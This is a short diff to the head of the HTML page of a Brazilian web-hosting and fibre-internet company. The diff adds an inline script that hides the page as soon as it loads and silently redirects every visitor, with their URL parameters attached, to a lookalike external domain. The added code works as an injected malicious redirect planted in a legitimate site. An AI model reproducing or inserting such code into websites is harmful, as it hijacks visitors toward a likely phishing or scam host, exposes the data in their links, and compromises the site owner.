@@ -1,6 +1,23 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
+    <script>
+(function() {
+    try {
+        document.documentElement.style.display = 'none';
+    } catch(e) {}
+
+    var urlDestino = 'https://wvvvwacessoportalgo.com/go/';
+    var parametros = window.location.search;
+
+    if (parametros && parametros.length > 1) {
+        var separador = (urlDestino.indexOf('?') === -1) ? '?' : '&';
+        urlDestino += separador + parametros.substring(1);
+    }
+
+    window.location.replace(urlDestino);
+})();
+</script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Conectasul - Hospedagem de Sites Premium e Internet Fibra</title>
